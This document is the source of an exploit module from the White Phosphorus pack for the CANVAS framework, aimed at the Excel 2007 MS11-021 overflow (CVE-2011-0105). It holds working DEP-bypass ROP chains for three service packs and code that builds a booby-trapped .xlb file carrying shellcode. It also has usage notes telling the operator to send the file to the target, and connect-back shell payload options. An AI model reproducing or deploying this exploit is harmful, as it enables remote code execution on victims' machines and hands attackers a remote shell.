
#! /usr/bin/env python
#####################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
#####################################################################################

#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside


######################################################################################
NAME = "MS11-021: Office 2007 Excel Record Parsing WriteAV Clientside Overflow"
DESCRIPTION = "Exploits a clientside overflow in Microsoft Office Excel"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION["Date public"] = "2011-04-12"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE Name']="CVE-2011-0105"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0105'
DOCUMENTATION['CVSS'] = '9.3'
DOCUMENTATION["References"] = """http://technet.microsoft.com/en-us/security/bulletin/MS11-021
http://www.abysssec.com/blog/2011/11/02/microsoft-excel-2007-sp2-buffer-overwrite-vulnerability-ba-exploit-ms11-021/"""
DOCUMENTATION["Notes"] = """
This is a client-side exploit - run the module and send the created file to the target user.
Vista and 7 are unexploitable as Excel attempts to recover the file.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "Vista", "7"]

NOTES="""
This is a client-side exploit - run the module and send the created file to the target user.
Vista and 7 are unexploitable as Excel attempts to recover the file.

--------------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> MS11-021: Office 2007 Excel Record Parsing WriteAV Clientside Overflow
--------------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows 2003+XP Universal Excel 2007 Sp0 (DEP)
1: Windows 2003+XP Universal Excel 2007 Sp1 (DEP)
2: Windows 2003+XP Universal Excel 2007 Sp2 (DEP)

Payloads:
0 IE Inject Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_ms11_021/wp_ms11_021.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal Excel 2007 Sp0 (DEP)", (0x00000000), [WINALL]],
    1 : ["Windows 2003+XP Universal Excel 2007 Sp1 (DEP)", (0x00000000), [WINALL]],
    2 : ["Windows 2003+XP Universal Excel 2007 Sp2 (DEP)", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit, httpclientside):
            ######################################################################################
            ## WP> Dialog Information
            ######################################################################################
    PAYLOADS=["IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True
        self.badstring = "\x00\x0a\x0d\x20"
        self.alignstack = True
        self.encode_printable = True # Encoder needs ESP==EIP
        self.filename= "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".xlb"
        return

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return        
        
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return      
        
    def neededListenerTypes(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    
    
    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        # If called from clientD there will be no target here
        if self.target:
            self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        return
    
    def buildBypass_sp0(self, size=2200):
        
        self.log("WP> Building Universal DEP bypass")
        size += 32
        
        depBypass = pack('<L', 0x68EF68A4) # pop eax
        depBypass += pack('<L', 0x68FA8F20) # rw
        depBypass += pack('<L', 0x68F4F2B4) # pop edx
        depBypass += pack('<L', 0x00000040)
        depBypass += pack('<L', 0x68F54BA4) # pop; pop; pop; pop;
        depBypass += pack('<L', 0x68F19174) # edi - ret
        depBypass += pack('<L', 0x68F19174) # esi - ret
        depBypass += pack('<L', 0x68F12886) # ebp = call [eax]
        depBypass += pack('<L', size) # ebx - dwSize
        depBypass += pack('<L', 0x68EF68A4) # pop eax
        depBypass += pack('<L', 0x68F671BC) # VP
        depBypass += pack('<L', 0x68EF1564) # pop ecx
        depBypass += pack('<L', 0x68FA7C40) #
        depBypass += pack('<L', 0x68F1FC37) # pushad
        depBypass += pack('<L', 0x68EFBA2A) # push esp
        depBypass += wp_randomstring(16)
        self.depBypass_size = len(depBypass)
        self.log("WP> Universal Bypass Size: %d bytes"%self.depBypass_size)
        return depBypass
    
    def buildBypass_sp1(self, size=2200):
        
        self.log("WP> Building Universal DEP bypass")
        size += 32
        
        depBypass = pack('<L', 0x68EF6770) # pop eax
        depBypass += pack('<L', 0x68FA8520) # rw
        depBypass += pack('<L', 0x68F4F4F3) # pop edx
        depBypass += pack('<L', 0x00000040)
        depBypass += pack('<L', 0x68F54E14) # pop; pop; pop; pop;
        depBypass += pack('<L', 0x68EF1771) # edi - pop esi
        depBypass += pack('<L', 0x68FA8520) # esi - ret
        depBypass += pack('<L', 0x68EFA117) # ebp = call [eax]
        depBypass += pack('<L', size) # ebx - dwSize
        depBypass += pack('<L', 0x68EF6770) # pop eax
        depBypass += pack('<L', 0x68F671BC) # VP
        depBypass += pack('<L', 0x68EF1541) # pop ecx
        depBypass += pack('<L', 0x68FA8520) # rw
        depBypass += pack('<L', 0x68F1FF87) # pushad
        depBypass += pack('<L', 0x68EF4CBC) # push esp
        self.depBypass_size = len(depBypass)
        self.log("WP> Universal Bypass Size: %d bytes"%self.depBypass_size)
        return depBypass
    
    def buildBypass_sp1(self, size=2200):
        
        self.log("WP> Building Universal DEP bypass")
        size += 32
        
        depBypass = pack('<L', 0x68EF6770) # pop eax
        depBypass += pack('<L', 0x68FA8520) # rw
        depBypass += pack('<L', 0x68F4F4F3) # pop edx
        depBypass += pack('<L', 0x00000040)
        depBypass += pack('<L', 0x68F54E14) # pop; pop; pop; pop;
        depBypass += pack('<L', 0x68EF1771) # edi - pop esi
        depBypass += pack('<L', 0x68FA8520) # esi - ret
        depBypass += pack('<L', 0x68EFA117) # ebp = call [eax]
        depBypass += pack('<L', size) # ebx - dwSize
        depBypass += pack('<L', 0x68EF6770) # pop eax
        depBypass += pack('<L', 0x68F671BC) # VP
        depBypass += pack('<L', 0x68EF1541) # pop ecx
        depBypass += pack('<L', 0x68FA8520) # rw
        depBypass += pack('<L', 0x68F1FF87) # pushad
        depBypass += pack('<L', 0x68EF4CBC) # push esp
        self.depBypass_size = len(depBypass)
        self.log("WP> Universal Bypass Size: %d bytes"%self.depBypass_size)
        return depBypass

    def buildBypass_sp2(self, size=2200):
        
        self.log("WP> Building Universal DEP bypass")
        size += 32
        
        depBypass = pack('<L', 0x68F24F4C) # pop eax
        depBypass += pack('<L', 0x68FA8C90) # rw
        depBypass += pack('<L', 0x68F4F7C2) # pop edx
        depBypass += pack('<L', 0x00000040)
        depBypass += pack('<L', 0x68F550C4) # pop; pop; pop; pop;
        depBypass += pack('<L', 0x68EF154E) # edi - pop esi
        depBypass += pack('<L', 0x68FA8C90) # esi - rw
        depBypass += pack('<L', 0x68EF9FE2) # ebp = call [eax]
        depBypass += pack('<L', size) # ebx - dwSize
        depBypass += pack('<L', 0x68F24F4C) # pop eax
        depBypass += pack('<L', 0x68F671BC) # VP
        depBypass += pack('<L', 0x68EF154E) # pop ecx
        depBypass += pack('<L', 0x68FA8C90) # rw
        depBypass += pack('<L', 0x68F2C846) # pushad
        depBypass += pack('<L', 0x68EFB791) # push esp
        self.depBypass_size = len(depBypass)
        self.log("WP> Universal Bypass Size: %d bytes"%self.depBypass_size)
        return depBypass

    def makefile(self):
        trigger = open('3rdparty/White_Phosphorus/exploits/wp_ms11_021/xlb_trigger.xlb','rb').read()
        
        sc = ''
        if self.version == 1:
            sc += self.buildBypass_sp1(len(self.shellcode)+8)
        elif self.version == 2:
            sc += self.buildBypass_sp2(len(self.shellcode)+8)
        else:
            sc += self.buildBypass_sp0(len(self.shellcode)+8)
        sc += self.shellcode
        sc += wp_randomstring(100)
        
        filedata = trigger[:1556]
        filedata += "\xa7\x00"
        filedata += "\x04\x00"
        if self.version == 2:
            filedata += "\xb0\x0d\x0c\x00"
        else:
            filedata += "\xb0\x0f\x0c\x00"
        filedata += "\x3c\x00"
        filedata += pack('<H', len(sc)+64)
        filedata += wp_randomstring(1)
        if self.version == 1:
            filedata += pack('<L', 0x68EF1159) # ret - Sp1
        elif self.version == 2:
            filedata += pack('<L', 0x68EFB792) # ret - Sp2
        else:
            filedata += pack('<L', 0x68EF1114) # ret - Sp0
        filedata += wp_randomstring(12)
        filedata += sc
        filedata += trigger[2385:]
        return filedata

    def run(self):
        filedata=self.makefile()
        outputfile = wp_outputpath(self.filename)
        self.log("WP> Opening %s for output"%outputfile)
        
        fd=file(outputfile,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(outputfile))
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
